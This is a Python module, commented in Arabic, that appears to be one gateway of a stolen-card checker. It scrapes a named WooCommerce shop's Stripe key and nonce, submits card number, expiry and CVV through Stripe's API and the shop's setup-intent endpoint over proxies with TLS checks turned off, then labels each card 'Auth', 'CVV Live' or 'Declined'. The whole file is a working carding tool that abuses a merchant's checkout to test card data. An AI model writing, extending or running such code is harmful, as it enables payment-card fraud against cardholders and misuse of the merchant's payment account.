
"""
بوابة الدفع: Stripe Auth ST-2
الموقع: chazedward.com
نوع البوابة: Stripe Auth (WooCommerce Stripe)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج publishableKey و nonce
2. POST https://api.stripe.com/v1/payment_methods -> الحصول على pm_id
3. POST /wp-admin/admin-ajax.php (wc_stripe_create_and_confirm_setup_intent) -> النتيجة النهائية
"""
import aiohttp
import asyncio
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 1: جلب publishableKey و nonce."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            "https://chazedward.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        pk_match = re.search(r'publishableKey":"(pk_live_[^"]+)"', text)
        pk = pk_match.group(1) if pk_match else ""
        if not pk:
            raise RuntimeError("publishableKey not found in page")

        nonce_match = re.search(
            r'wc-stripe-create-and-confirm-setup-intent-nonce":"([^"]+)"', text
        )
        nonce = nonce_match.group(1) if nonce_match else ""
        return pk, nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_tokens failed: {e}") from e


async def req2_create_payment_method(
    session: aiohttp.ClientSession,
    pk: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إنشاء Payment Method عبر Stripe API."""
    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "key": pk,
    }
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        pm_id = res.get("id")
        if not pm_id:
            error_msg = res.get("error", {}).get("message", "Unknown Stripe Error")
            raise RuntimeError(error_msg)
        return pm_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_create_payment_method failed: {e}") from e


async def req3_confirm_setup_intent(
    session: aiohttp.ClientSession,
    pm_id: str,
    nonce: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 3: تأكيد Setup Intent والحصول على النتيجة النهائية."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    }
    data = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "_ajax_nonce": nonce,
    }
    try:
        async with session.post(
            "https://chazedward.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req3_confirm_setup_intent failed: {e}") from e


async def process_ST_2(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Auth ST-2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                cookies = load_cookies(get_cookies_path("ST-3Cookies.txt"))
                session.cookie_jar.update_cookies(cookies)
            except Exception:
                pass

            pk, nonce = await req1_get_tokens(session, proxy_url)
            pm_id = await req2_create_payment_method(session, pk, cc, mes, ano, cvv, proxy_url)
            final_res = await req3_confirm_setup_intent(session, pm_id, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    success = final_res.get("success", False)
    data = final_res.get("data", {})

    if success:
        return f"𝐀𝐮𝐭𝐡 ✅ | {cc}|{mes}|{ano}|{cvv}", "Succeeded"

    status = data.get("status", "")
    if status == "requires_action" or "requires_confirmation" in str(final_res):
        return f"𝐂𝐕𝐕 𝐋𝐢𝐯𝐞 ✅ | {cc}|{mes}|{ano}|{cvv}", "Requires Action"

    error_message = data.get("error", {}).get("message", str(final_res)[:120])
    return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", error_message
